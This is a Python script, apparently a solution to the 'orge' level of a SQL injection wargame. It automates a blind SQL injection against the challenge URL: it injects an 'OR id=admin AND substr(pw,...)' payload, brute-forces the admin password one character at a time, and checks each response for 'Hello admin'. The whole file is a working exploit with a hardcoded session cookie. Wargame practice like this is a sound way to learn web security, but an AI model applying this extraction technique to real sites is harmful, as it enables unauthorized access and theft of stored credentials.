import requests

url = "https://los.rubiya.kr/chall/orge_bad2f25db233a7542be75844e314e9f3.php?"
cookie = {'PHPSESSID' :'8kpa1rekli8tna9upj3r6bb63d'}

length = 8
pw = ''

for i in range (1, length+1) :
    for j in range(0x20, 0x7e+1) :
        query = 'pw=\' || id=\'admin\' %26%26 substr(pw,1,{})=\'{}\'%23'.format(i, pw+chr(j))
        print(query,'\tfind:',pw)

        req = requests.get(url+query, cookies=cookie)
        if('Hello admin' in req.text) :
            pw += chr(j)
            break

print('result:',pw)